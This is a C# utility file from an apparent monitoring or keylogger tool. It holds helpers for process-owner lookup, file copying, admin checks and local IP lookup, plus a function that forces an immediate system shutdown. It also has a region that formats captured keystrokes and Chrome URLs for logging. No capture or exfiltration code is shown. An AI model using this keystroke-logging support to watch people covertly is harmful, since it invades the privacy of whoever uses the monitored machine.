using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Management;
using System.Threading.Tasks;
using System.IO;
using System.Security.Principal;
using System.Net;
using System.Net.Sockets;
using System.Diagnostics;

namespace SnS.Functions
{
    class Functions
    {
        public static string getUserInfo(ManagementObject proc)
        {
            if (proc["ExecutablePath"] != null)
            {

                string[] OwnerInfo = new string[2];
                proc.InvokeMethod("GetOwner", (object[])OwnerInfo);

                return OwnerInfo[0];
            }

            return null;
        }

        public static void copyFile(string szFileName, string szSourcePath, string szDestPath)
        {
            string sourceFile = System.IO.Path.Combine(szSourcePath, szFileName);
            string destFile = System.IO.Path.Combine(szDestPath, szFileName);

            // To copy a folder's contents to a new location:
            // Create a new target folder, if necessary.
            if (!System.IO.Directory.Exists(szDestPath))
            {
                System.IO.Directory.CreateDirectory(szDestPath);
            }

            // To copy a file to another location and 
            // overwrite the destination file if it already exists.
            System.IO.File.Copy(sourceFile, destFile, true);

            // To copy all the files in one directory to another directory.
            // Get the files in the source folder. (To recursively iterate through
            // all subfolders under the current directory, see
            // "How to: Iterate Through a Directory Tree.")
            // Note: Check for target path was performed previously
            //       in this code example.
            if (System.IO.Directory.Exists(szSourcePath))
            {
                string[] files = System.IO.Directory.GetFiles(szSourcePath);

                // Copy the files and overwrite destination files if they already exist.
                foreach (string s in files)
                {
                    // Use static Path methods to extract only the file name from the path.
                    szFileName = System.IO.Path.GetFileName(s);
                    destFile = System.IO.Path.Combine(szDestPath, szFileName);
                    System.IO.File.Copy(s, destFile, true);
                }
            }
            else
            {
                Console.WriteLine("Source path does not exist!");
            }

            // Keep console window open in debug mode.
        }

        //writes the current date and time to a file, using one of the written formats
        public static void writeCurrentDate(TextWriter tw, int nFormat)
        {
            if (tw != null)
            {
                if (nFormat == 1)
                {
                    tw.WriteLine();
                    tw.WriteLine("---------- " + DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss") + " ----------");
                    tw.WriteLine();
                }
                else
                    if (nFormat == 2)
                    {
                        tw.Write(DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss") + " -- ");
                    }
            }
        }

#region KeyLogger filter

        //Filters the input of the key logger to make the output easier to read.
        private static bool bHasCaps = false;
        private static bool bHasShift = false;
        public static string filterInput(string szInput)
        {
            string[] szLowPriority = {"LButton", "RButton", "MButton" };
            string[] szMediumPriority = {"Home", "End", "Tab", "Delete", "Return", "Slash", "Backslash",
                                         "ControlKey", "LControlKey", "RControlKey", "Menu",
                                         "LMenu", "RMenu", "Insert", "Scorll", "PrintScreen", "Pause",
                                         "Return", "Left", "Up", "Right", "Down", "Next", "PageUp",
                                         "Home", "PageDown", "Escape", "ShiftKey LShiftKey",
                                         "ShiftKey RShiftKey", "ShiftKey", "LShiftKey", "RShiftKey"};
            string[] szHighPriority = { "OemQuestion", "OemPeriod", "Oemcomma", "Oem1", "Oem5",
                                        "Oem7", "OemOpenBrackets", "Oem6", "OemMinus",
                                        "Oemplus"};
            string[] szDigits = { "D1", "D2", "D3", "D4", "D5", "D6", "D7", "D8", "D9", "D0"};
            string[] szFs = { "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "F11", "F12"};
            string[] szShifts = {"ShiftKey LShiftKey", "ShiftKey RShiftKey", "ShiftKey", "LShiftKey",
                                 "RShiftKey"};

            if (szInput == "\\")
                return "|";

            if (szInput == "Space")
                return " ";

            if (szInput == "Capital")
            {
                bHasCaps = !bHasCaps;
                return bHasCaps == false ? " </Caps> " : " <Caps> ";
            }


            foreach (string s in szLowPriority)
            {
                if (s.Equals(szInput))
                    return String.Empty;
            }

            foreach (string s in szMediumPriority)
            {
                if (s.Equals(szInput))
                    return "<" + szInput + ">";
            }

            foreach (string s in szHighPriority)
            {
                if (s.Equals(szInput))
                    return handleHighPriority(szInput);
            }

            foreach (string s in szDigits)
            {
                if (s.Equals(szInput))
                    return "(digit)" + szInput[1];
            }

            foreach (string s in szFs)
            {
                if (s.Equals(szInput))
                    return "(f)" + szInput;
            }


            foreach (string s in szShifts)
            {
                if (s.Equals(szInput))
                    bHasShift = !bHasShift;
            }

          
            return bHasShift == false ? szInput : "(shifted)" + szInput;

        }

        private static string handleHighPriority(string s)
        {
            string text = String.Empty;

            if (s == "OemQuestion")
            {
                text = "(QuestionMark)";
            }
            else 
            if (s == "OemPeriod")
            {
                text = ".";
            }
            else
            if (s == "Oemcomma")
            {
                text = ",";
            }
            else
            if (s == "OemMinus")
            {
                text = "-";
            }
            else
            if (s == "OemPlus")
            {
                text = "+";
            }        



            return text;
        }


#endregion

#region ChromeFilter

        public static string filterChrome(string szURL) 
        {
            szURL = szURL.Replace("?", "(QuestionMark)");
            szURL = szURL.Replace("/", "|");
            szURL = szURL.Replace("\\", "|");

            return szURL;
        }

#endregion

        public static bool isAdministrator()
        {
            bool bIsAdmin;
            try
            {
                //get the currently logged in user and check admin privileges
                WindowsIdentity user = WindowsIdentity.GetCurrent();
                WindowsPrincipal principal = new WindowsPrincipal(user);
                bIsAdmin = principal.IsInRole(WindowsBuiltInRole.Administrator);
            }
            catch (UnauthorizedAccessException ex)
            {
                bIsAdmin = false;
            }
            catch (Exception ex)
            {
                //TODO
                bIsAdmin = false;
            }
            return bIsAdmin;
        }

        public static string escapeString(string szString)
        {
            string szReturnString;
            szReturnString = szString.Replace("\\","|");
            szReturnString = szReturnString.Replace("/", "|");

            return szReturnString;
        }

        public static string getLocalIPAddress()
        {
            IPHostEntry host;
            string localIP = "";
            host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (IPAddress ip in host.AddressList)
            {
                if (ip.AddressFamily == AddressFamily.InterNetwork)
                {
                    localIP = ip.ToString();
                    break;
                }
            }
            return localIP;
        }

        public static void shutdown()
        {
            Process.Start("shutdown", string.Format(@"/s /t 0 /m \\{0}", getLocalIPAddress()));
        }

    }
}
